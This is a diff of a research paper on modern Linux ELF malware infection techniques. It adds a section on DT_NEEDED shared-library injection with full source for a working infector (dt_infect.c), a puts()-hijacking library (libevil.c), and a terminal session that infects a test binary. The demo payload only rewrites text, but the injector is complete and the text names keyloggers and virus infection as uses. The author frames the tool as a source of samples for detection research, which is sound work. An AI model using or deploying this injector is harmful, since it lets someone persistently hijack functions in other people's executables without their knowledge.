@@ -1,18 +1,20 @@
 Modern day Linux malware infection techniques with ELF
 Author: ElfMaster - ryan@bitlackeys.org
 
-Introduction
-Code injection techniques
-Traditional text segment padding infection
-Text segment padding infection in SCOP binaries
-Psuedo-Code of SCOP Text segment padding infection
-Traditional reverse text padding infections
-Qualities of a reverse text padding infection
-SCOP Reverse text infections
-UTI (Ultimate text infection) for SCOP binaries only
-SCOP UTI (Ultimate text infection) algorithm
-Note on resolving the address of Elf_hdr->e_entry in PIE executable's
-Resurrecting the past with DT_NEEDED .so injection techniques
+- Introduction
+- Code injection techniques
+- Traditional text segment padding infection
+- Text segment padding infection in SCOP binaries
+- Psuedo-Code of SCOP Text segment padding infection
+- Traditional reverse text padding infections
+- Qualities of a reverse text padding infection
+- SCOP Reverse text infections
+- UTI (Ultimate text infection) for SCOP binaries only
+- SCOP UTI (Ultimate text infection) algorithm
+- Note on resolving the address of Elf_hdr->e_entry in PIE executable's
+- Resurrecting the past with DT_NEEDED .so injection techniques
+- Example of using dt_infect for shared library injection
+- DT_NEEDED infection algorithm for symbol hijacking
 
 -= 1.0 Introduction
 
@@ -25,7 +27,8 @@ these ELF binaries are linked.	Pre-requisite reading [1] will be useful and I
 will assume the reader has a complete understanding of the SCOP binary
 mitigation before jumping right into 'infection techniques for parisitic code',
 which could also be termed 'injection techniques' for innovative
-instrumentation depending on the motives.
+instrumentation depending on the motives. All of the code in this paper uses
+libelfmaster [9] for portable design and convenience.
 
 In this paper we will cover alot of ground; in addition to a discussion
 on ELF infection with SCOP binaries, and traditional binaries, we will also
@@ -262,8 +265,8 @@ while (elf_segment_iterator_next(&p_iter, &segment) != NULL) {
 
 -= 3.0 Traditional reverse text padding infections
 
-A reverse text padding infection, which a good example can be demonstrated in
-the Skeksi Virus [6] is the concept of:
+A reverse text padding infection of which a good example can be demonstrated in
+the Skeksi Virus [6], is the concept of:
 
 1. subtracting the text segment's p_vaddr by PAGE_ALIGN(parasite_len) 
 
@@ -354,7 +357,7 @@ because SCOP binaries have p_offset's that are identical to their p_vaddr's for
 the first 3 load segments. This is not necessary, because the only requirement
 for an executable segment to load is that its p_vaddr and p_offset must be
 congruent modulo a PAGE_SIZE. Looking at the first 3 PT_LOAD segments 
-we can see that there is a fast amount of space on-disk in between the 1st and 2nd
+we can see that there is a vast amount of space on-disk in between the 1st and 2nd
 segment, and in between the 2nd and 3rd segment. The 2nd segment is R+X so this
 is ideally the one we want to use. In the test_scop binary the 2nd PT_LOAD segment
 has a p_filesz of 0x24d (589 decimal) bytes. The offset of the 3rd segment is at
@@ -643,6 +646,558 @@ done:
 
 -= 4.0 Resurrecting the past with DT_NEEDED .so injection techniques
 
+Recently I have been building ELF malware detection technology and am not always
+able to find the samples I need for certain infection types. I needed a
+DT_NEEDED infector, and one that was capable of overriding existing symbols
+through shared library resolution precedence-- this results in a sort of
+permanent LD_PRELOAD effect.  Traditionally hackers have overwritten the
+DT_DEBUG dynamic tag and changed it to a DT_NEEDED, which is quite easy to
+detect. dt_infect v1.0 https://github.com/elfmaster/dt_infect [8] is able to
+infect using both methods. Originally I thought that Mayhem, the innovative
+force (and brilliant hacker all around) behind ERESI [7] had only written about
+DT_DEBUG overwrites, but I took a skim over a rather old phrack publication
+[6] and discovered that he had already covered both DT_NEEDED infection
+techniques; including precedence overriding for symbol hijacking. Props
+to Mayhem for paving the way for many others.
+
+I'm not entirely sure of the algorithm that ERESI [7] uses for DT_NEEDED
+infection, but I imagine it is very similar to how dt_infect [8] works.
+
+-= 4.1 Example of using dt_infect for shared library injection
+
+The goal of this infection is to add a shared library dependency to a binary
+so that the library is loaded before any others. This is similar to using
+LD_PRELOAD. Create a shared library with a function from libc.so that you
+want to hijack, and modify its behavior before calling the original function
+using dlsym(). This is essentially shared library injection into an executable
+and can be used for all sorts of creative reasons: keyloggers, virus infection,
+security instrumentation, etc. In the following example we hijack the function
+called 'void puts(const char *)' from libc. The libevil.c code is the shared
+library we are going to inject that has a modified version of puts().
+
+$ ./test
+I am a host executable for testing purposes
+$ readelf -d test | grep NEEDED
+0x0000000000000001 (NEEDED)		Shared library: [libc.so.6]
+$ ./inject test
+Creating reverse text padding infection to store new .dynstr section
+Updating .dynstr section
+Modified d_entry.value of DT_STRTAB to: 3ff040 (index: 9)
+Successfully injected 'libevil.so' into target: 'test'. Make sure to move 'libevil.so' into one of the shared object search paths, i.e. /lib/x86_64-gnu-linux/
+
+$ sudo cp libevil.so /lib/x86_64-linux-gnu/
+$ sudo ldconfig
+$ ./test
+$ readelf -d test | grep NEEDED
+ 0x0000000000000001 (NEEDED)		 Shared library: [libevil.so]
+ 0x0000000000000001 (NEEDED)		 Shared library: [libc.so.6]
+$ ./test
+1 4m 4 h057 3x3cu74bl3 f0r 73571ng purp0535
+$ 
+
+
+-= 4.2 DT_NEEDED infection algorithm for symbol hijacking
+
+NOTE: I naively used a reverse-text-padding infection to make room
+for the new .dynstr section. This however does not work with PIE
+binaries due to the constraints on that infection method. This is
+of course trivial to fix by simply changing the injection method
+to something that works with PIE (i.e. text padding infection,
+or PT_NOTE to PT_LOAD infection, UTI infection etc.).
+
+1. Reverse text infection to make space for a new .dynstr section
+2. memcpy old .dynstr into the code cave created by step 1
+3. Append a terminated string with the evil shared library basename to
+the new .dynstr
+4. Confirm there is enough space after the dynamic segment to shift all
+ElfN_Dyn entries forward by sizeof(Elf_Dyn) entry bytes.
+5. Re-create the dynamic segment in the following way:
+	- Insert a new DT_NEEDED entry before any other dynamic tags
+	  and its d_un.d_val should point to dynstr_vaddr + old_dynstr_len
+	- Modify DT_STRTAB tag so that d_un.d_val = dynstr_vaddr
+	- The new dynamic segment should look something like this:
+	  [DT_NEEDED: "evil_lib.so"]
+	  [DT_NEEDED: "libc.so"]
+	  [.. several more tags ...]
+	  [DT_STRTAB: 0x3ff000] (Address of new .dynstr location)
+
+
+The code in libevil.c will demonstrate how we modify the behavior of the 'void
+puts(const char *)' function from libc.so. The dt_infect code below that will
+demonstrate the algorithm for injecting the libevil.so dependency into a target
+executable. This will only work with executables that are ET_EXEC's due to the
+reverse text padding injection for the .dynstr table. Notice that dt_infect has
+a -f option to overwrite the DT_DEBUG tag instead of overriding other
+dependencies with your own shared object; this will however require manual
+modification of the .got.plt table to call your functions.
+
+-= 4.3 The code for DT_NEEDED infection with symbol hijacking.
+
+---- libevil.c ----
+
+/*
+ * l33t sp34k version of puts() for DT_NEEDED .so injection
+ * elfmaster 2/15/2019
+ */
+#define _GNU_SOURCE
+#include <dlfcn.h>
+
+/*
+ * This code is a l33t sp34k version of puts
+ */
+
+long _write(long, char *, unsigned long);
+
+char _toupper(char c)
+{
+	if( c >='a' && c <= 'z')
+		return (c = c +'A' - 'a');
+	return c;
+}
+
+void ___memset(void *mem, unsigned char byte, unsigned int len)
+{
+	unsigned char *p = (unsigned char *)mem;
+	int i = len;
+	while (i--) {
+		*p = byte;
+		p++;
+	}
+}
+
+int puts(const char *string)
+{
+	char *s = (char *)string;
+	char new[1024];
+	int index = 0;
+
+	int (*o_puts)(const char *);
+
+	o_puts = (int (*)(const char *))dlsym(RTLD_NEXT, "puts");
+
+	___memset(new, 0, 1024);
+	while (*s != '\0' && index < 1024) {
+		switch(_toupper(*s)) {
+			case 'I':
+				new[index++] = '1';
+				break;
+			case 'E':
+				new[index++] = '3';
+				break;
+			case 'S':
+				new[index++] = '5';
+				break;
+			case 'T':
+				new[index++] = '7';
+				break;
+			case 'O':
+				new[index++] = '0';
+				break;	
+			case 'A':
+				new[index++] = '4';
+				break;
+			default:
+				new[index++] = *s;
+				break;
+		}
+		s++;
+	}
+
+	return o_puts((char *)new);
+}
+
+More interestingly is the code that injects this shared object dependency into
+the target executable.
+
+---- dt_infect.c ----
+
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <elf.h>
+#include <link.h>
+#include <stdbool.h>
+#include <unistd.h>
+
+#include "/opt/elfmaster/include/libelfmaster.h"
+
+#define PAGE_ALIGN_UP(x) ((x + 4095) & ~4095)
+
+#define PT_PHDR_INDEX 0
+#define PT_INTERP_INDEX 1
+
+#define TMP "xyz.tmp"
+
+bool dt_debug_method = false;
+bool calculate_new_dynentry_count(elfobj_t *, uint64_t *, uint64_t *);
+
+/*
+ * arg1: target elf object
+ * arg2: string name, i.e. "evil.so"
+ * arg3: address of .dynstr (Which is now in a different location)
+ * arg4: offset of "evil.so" within .dynstr
+ */
+bool
+modify_dynamic_segment(elfobj_t *target, uint64_t dynstr_vaddr,
+    uint64_t evil_offset)
+{
+	bool use_debug_entry = false;
+	bool res;
+	uint64_t dcount, dpadsz, index;
+	uint64_t o_dcount = 0, d_index = 0, dt_debug_index = 0;
+	elf_dynamic_entry_t d_entry;
+	elf_dynamic_iterator_t d_iter;
+	elf_error_t error;
+	struct tmp_dtags {
+		bool needed;
+		uint64_t value;
+		uint64_t tag;
+		TAILQ_ENTRY(tmp_dtags) _linkage;
+	};
+	struct tmp_dtags *current;
+	TAILQ_HEAD(, tmp_dtags) dtags_list;
+	TAILQ_INIT(&dtags_list);
+
+	if (calculate_new_dynentry_count(target, &dcount, &dpadsz) == false) {
+		fprintf(stderr, "Failed to calculate padding size after dynamic section\n");
+		return false;
+	}
+	if (dcount == 0) {
+		fprintf(stderr, "Not enough room to shift dynamic entries forward"
+		    ", falling back to overwriting DT_DEBUG with DT_NEEDED\n");
+		use_debug_entry = true;
+	} else if (dt_debug_method == true) {
+		fprintf(stderr, "Forcing DT_DEBUG overwrite. This technique will not give\n"
+		    "your injected shared library functions precedence over any other libraries\n"
+		    "and will therefore require you to manually overwrite the .got.plt entries to\n"
+		    "point at your custom shared library function(s)\n");
+		use_debug_entry = true;
+	}
+	elf_dynamic_iterator_init(target, &d_iter);
+	for (;;) {
+		res = elf_dynamic_iterator_next(&d_iter, &d_entry);
+		if (res == ELF_ITER_DONE)
+			break;
+		if (res == ELF_ITER_ERROR) {
+			fprintf(stderr, "elf_dynamic_iterator_next failed\n");
+			return false;
+		}
+		struct tmp_dtags *n = malloc(sizeof(*n));
+
+		if (n == NULL) {
+			perror("malloc");
+			return false;
+		}
+		n->value = d_entry.value;
+		n->tag = d_entry.tag;
+		if (n->tag == DT_DEBUG)	{
+			dt_debug_index = d_index;
+		}
+		TAILQ_INSERT_TAIL(&dtags_list, n, _linkage);
+		d_index++;
+	}
+
+	/*
+	 * In the following code we modify dynamic segment to look like this:
+	 * Original: DT_NEEDED: "libc.so", DT_INIT: 0x4009f0, etc.
+	 * Modified: DT_NEEDED: "evil.so", DT_NEEDED: "libc.so", DT_INIT: 0x4009f0, etc.
+	 * Which acts like a permanent LD_PRELOAD.
+	 * ...
+	 * If there is no room to shift the dynamic entriess forward (Which there in
+	 * general is enough space to add atleast several) then we fall back on a less
+	 * elegant and easier to detect method where we overwrite DT_DEBUG and change
+	 * it to a DT_NEEDED entry. This is easier to detect because of the fact that
+	 * the linker always creates DT_NEEDED entries so that they are contiguous
+	 * whereas in this case the DT_DEBUG that we overwrite is generally about 11
+	 * entries after the last DT_NEEDED entry.
+	 */
+
+	index = 0;
+	if (use_debug_entry == false) {
+		d_entry.tag = DT_NEEDED;
+		d_entry.value = evil_offset; /* Offset into .dynstr for "evil.so" */
+		res = elf_dynamic_modify(target, 0, &d_entry, true, &error);
+		if (res == false) {
+			fprintf(stderr, "elf_dynamic_modify failed: %s\n",
+			    elf_error_msg(&error));
+			return false;
+		}
+		index = 1;
+	}
+
+	TAILQ_FOREACH(current, &dtags_list, _linkage) {
+		if (use_debug_entry == true && current->tag == DT_DEBUG) {
+			if (dt_debug_index == 0) {
+				printf("Could not find DT_DEBUG entry, injection has failed\n");
+				return false;
+			}
+			printf("%sOverwriting DT_DEBUG at index: %zu\n",
+			    dcount == 0 ? "Falling back to " : "", dt_debug_index);
+			d_entry.tag = DT_NEEDED;
+			d_entry.value = evil_offset;
+			res = elf_dynamic_modify(target, dt_debug_index, &d_entry, true, &error);
+			if (res == false) {
+				fprintf(stderr, "elf_dynamic_modify failed: %s\n",
+				    elf_error_msg(&error));
+				return false;
+			}
+			goto next;
+		}
+		if (current->tag == DT_STRTAB) {
+			d_entry.tag = DT_STRTAB;
+			d_entry.value = dynstr_vaddr;
+			res = elf_dynamic_modify(target, index, &d_entry, true, &error);
+			if (res == false) {
+				fprintf(stderr, "elf_dynamic_modify failed: %s\n",
+				   elf_error_msg(&error));
+				return false;
+			}
+			printf("Modified d_entry.value of DT_STRTAB to: %lx (index: %zu)\n",
+			    d_entry.value, index);
+			goto next;
+		}
+#if 0
+		printf("Updating dyn[%zu]\n", index);
+#endif
+		d_entry.tag = current->tag;
+		d_entry.value = current->value;
+		res = elf_dynamic_modify(target, index, &d_entry, true, &error);
+		if (res == false) {
+			fprintf(stderr, "elf_dynamic_modify failed: %s\n",
+			    elf_error_msg(&error));
+			return false;
+		}
+next:
+		index++;
+	}
+	return true;
+}
+
+/*
+ * This function will tell us how many new ElfN_Dyn entries
+ * can be added to the dynamic segment, as there is often space
+ * between .dynamic and the section following it.
+ */
+bool
+calculate_new_dynentry_count(elfobj_t *target, uint64_t *count, uint64_t *size)
+{
+	elf_section_iterator_t s_iter;
+	struct elf_section section;
+	size_t len;
+	size_t dynsz = elf_class(target) == elfclass32 ? sizeof(Elf32_Dyn) :
+	    sizeof(Elf64_Dyn);
+	uint64_t dyn_offset = 0;
+
+	*count = 0;
+	*size = 0;
+
+	elf_section_iterator_init(target, &s_iter);
+	while (elf_section_iterator_next(&s_iter, &section) == ELF_ITER_OK) {
+		if (strcmp(section.name, ".dynamic") == 0) {
+			dyn_offset = section.offset;
+		} else if (dyn_offset > 0) {
+			len = section.offset - dyn_offset;
+			*size = len;
+			*count = len / dynsz;
+			return true;
+		}
+	}
+	return false;
+}
+
+int main(int argc, char **argv)
+{
+	uint8_t *mem;
+	elfobj_t so_obj;
+	elfobj_t target;
+	bool res, text_found = false;
+	elf_segment_iterator_t p_iter;
+	struct elf_segment segment;
+	struct elf_section section, dynstr_shdr;
+	elf_section_iterator_t s_iter;
+	size_t paddingSize, o_dynstr_size, dynstr_size, ehdr_size, final_len;
+	uint64_t old_base, new_base, n_dynstr_vaddr, evil_string_offset;
+	elf_error_t error;
+	char *evil_lib, *executable;
+	int fd;
+	ssize_t b;
+
+	if (argc < 3) {
+		printf("Usage: %s [-f] <lib.so> <target>\n", argv[0]);
+		printf("-f	Force DT_DEBUG overwrite technique\n");
+		exit(0);
+	}
+	if (argv[1][0] == '-' && argv[1][1] == 'f') {
+		dt_debug_method = true;
+		evil_lib = argv[2];
+		executable = argv[3];
+	} else {
+		evil_lib = argv[1];
+		executable = argv[2];
+	}
+	res = elf_open_object(executable, &target,
+	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error);
+	if (res == false) {
+		fprintf(stderr, "failed to open %s: %s\n", executable, elf_error_msg(&error));
+		exit(-1);
+	}
+	ehdr_size = elf_class(&target) == elfclass32 ?
+	    sizeof(Elf32_Ehdr) : sizeof(Elf64_Ehdr);
+
+	res = elf_section_by_name(&target, ".dynstr", &dynstr_shdr);
+	if (res == false) {
+		perror("failed to find section .dynstr\n");
+		exit(-1);
+	}
+	paddingSize = PAGE_ALIGN_UP(dynstr_shdr.size);
+
+	res = elf_segment_by_index(&target, PT_PHDR_INDEX, &segment);
+	if (res == false) {
+		fprintf(stderr, "Failed to find segment: %d\n", PT_PHDR_INDEX);
+		goto done;
+	}
+	segment.offset += paddingSize;
+	res = elf_segment_modify(&target, PT_PHDR_INDEX, &segment, &error);
+	if (res == false) {
+		fprintf(stderr, "elf_segment_modify failed: %s\n", elf_error_msg(&error));
+		goto done;
+	}
+	res = elf_segment_by_index(&target, PT_INTERP_INDEX, &segment);
+	if (res == false) {
+		printf("Failed to find segment: %d\n", PT_INTERP_INDEX);
+		goto done;
+	}
+	segment.offset += paddingSize;
+	res = elf_segment_modify(&target, PT_INTERP_INDEX, &segment, &error);
+	if (res == false) {
+		printf("elf_segment_modify failed: %s\n", elf_error_msg(&error));
+		goto done;
+	}
+	printf("Creating reverse text padding infection to store new .dynstr section\n");
+	elf_segment_iterator_init(&target, &p_iter);
+	while (elf_segment_iterator_next(&p_iter, &segment) == ELF_ITER_OK) {
+		if (text_found == true) {
+			segment.offset += paddingSize;
+			res = elf_segment_modify(&target, p_iter.index - 1,
+			    &segment, &error);
+			if (res == false) {
+				printf("elf_segment_modify failed: %s\n",
+				    elf_error_msg(&error));
+				goto done;
+			}
+		}
+		if (segment.type == PT_LOAD && segment.offset == 0) {
+			old_base = segment.vaddr;
+			segment.vaddr -= paddingSize;
+			segment.paddr -= paddingSize;
+			segment.filesz += paddingSize;
+			segment.memsz += paddingSize;
+			new_base = segment.vaddr;
+			text_found = true;
+			res = elf_segment_modify(&target, p_iter.index - 1,
+			    &segment, &error);
+			if (res == false) {
+				printf("elf_segment_modify failed: %s\n",
+				    elf_error_msg(&error));
+				goto done;
+			}
+		}
+	}
+	/* Adjust .dynstr so that it points to where the reverse
+	 * text extension is; right after elf_hdr and right before
+	 * the shifted forward phdr table.
+	 * Adjust all other section offsets by paddingSize to shift
+	 * forward beyond the injection site.
+	 */
+	elf_section_iterator_init(&target, &s_iter);
+	while(elf_section_iterator_next(&s_iter, &section) == ELF_ITER_OK) {
+		if (strcmp(section.name, ".dynstr") == 0) {
+			printf("Updating .dynstr section\n");
+			section.offset = ehdr_size;
+			section.address = old_base - paddingSize;
+			section.address += ehdr_size;
+			n_dynstr_vaddr = section.address;
+			evil_string_offset = section.size;
+			o_dynstr_size = section.size;
+			section.size += strlen(evil_lib) + 1;
+			dynstr_size = section.size;
+			res = elf_section_modify(&target, s_iter.index - 1,
+			    &section, &error);
+		} else {
+			section.offset += paddingSize;
+			res = elf_section_modify(&target, s_iter.index - 1,
+			    &section, &error);
+		}
+	}
+	elf_section_commit(&target);
+	if (elf_class(&target) == elfclass32) {
+		target.ehdr32->e_shoff += paddingSize;
+		target.ehdr32->e_phoff += paddingSize;
+	} else {
+		target.ehdr64->e_shoff += paddingSize;
+		target.ehdr64->e_phoff += paddingSize;
+	}
+	res = modify_dynamic_segment(&target, n_dynstr_vaddr, evil_string_offset);
+	if (res == false) {
+		fprintf(stderr, "modify_dynamic_segment failed\n");
+		exit(EXIT_FAILURE);
+	}
+	/*
+	 * Write out our new executable with new string table.
+	 */
+	fd = open(TMP, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU);
+	if (fd < 0) {
+		perror("open");
+		exit(EXIT_FAILURE);
+	}
+	/*
+	 * Write initial ELF file header
+	 */
+	b = write(fd, target.mem, ehdr_size);
+	if (b < 0) {
+		perror("write");
+		exit(EXIT_FAILURE);
+	}
+	/*
+	 * Write out our new .dynstr section into our padding space
+	 */
+	b = write(fd, elf_dynstr(&target), o_dynstr_size);
+	if (b < 0) {
+		perror("write");
+		exit(EXIT_FAILURE);
+	}
+	b = write(fd, evil_lib, strlen(evil_lib) + 1);
+	if (b < 0) {
+		perror("write");
+		exit(EXIT_FAILURE);
+	}
+
+	if ((b = lseek(fd, ehdr_size + paddingSize, SEEK_SET)) != ehdr_size + paddingSize) {
+		perror("lseek");
+		exit(EXIT_FAILURE);
+	}
+	mem = target.mem + ehdr_size;
+	final_len = target.size - ehdr_size;
+	b = write(fd, mem, final_len);
+	if (b != final_len) {
+		perror("write");
+		exit(EXIT_FAILURE);
+	}
+done:
+	elf_close_object(&target);
+	rename(TMP, executable);
+	printf("Successfully injected '%s' into target: '%s'. Make sure to move '%s'"
+	    " into one of the shared object search paths, i.e. /lib/x86_64-gnu-linux/\n",
+	    evil_lib, executable, evil_lib);
+	exit(EXIT_SUCCESS);
+}
 
 
 [1] https://www.bitlackeys.org/secure_code_partitioning_2018.txt
@@ -650,3 +1205,8 @@ done:
 [3] UNIX ELF parasites and viruses http://83.133.184.251/virensimulation.org/lib/vsc01.html
 [4] https://github.com/elfmaster/dsym_obfuscate
 [5] http://83.133.184.251/virensimulation.org/lib/vrn01.html (Retaliation Virus)
+[6] http://phrack.org/issues/61/8.html
+[7] http://www.eresi-project.org
+[8] https://github.com/elfmaster/dt_infect
+[9] https://github.com/elfmaster/libelfmaster
+
